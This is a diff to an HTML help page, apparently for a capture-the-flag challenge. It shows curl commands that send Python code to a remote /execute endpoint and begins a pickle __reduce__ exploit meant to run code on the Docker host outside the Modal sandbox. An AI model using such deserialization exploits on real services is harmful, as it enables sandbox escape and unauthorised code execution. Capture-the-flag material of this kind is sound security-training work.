@@ -23,12 +23,9 @@
 
     <div class="section">
         <h2>Example: Simple Code Execution</h2>
-        <p>Try running a simple Python script to verify the code is executing remotely (should show 'root' as the user):</p>
+        <p>Try running a simple Python script to verify the code is executing remotely in Modal:</p>
         <div class="code-block">curl -X POST [YOUR_URL]/execute --data-binary @- &lt;&lt;'EOF'
-import os, pwd
-username = pwd.getpwuid(os.getuid()).pw_name
-print(f"Running as: {username}")
-f"Result: 2+2={2+2}"
+f"2+2={2+2}"
 EOF</div>
     </div>
 
@@ -47,8 +44,8 @@ EOF</div>
     </div>
 
     <div class="section">
-        <h2>Example: Username Verification</h2>
-        <p>This exploit will show the username from the host system (should be different from 'root' if the exploit works):</p>
+        <h2>Example: Host Username Verification</h2>
+        <p>This exploit will show the $USER environment variable from the host system (should show 'ctfuser' on the Docker host, proving the exploit runs outside Modal):</p>
         <div class="code-block">curl -X POST [YOUR_URL]/execute --data-binary @- &lt;&lt;'EOF'
 class UserExploit:
     def __reduce__(self):
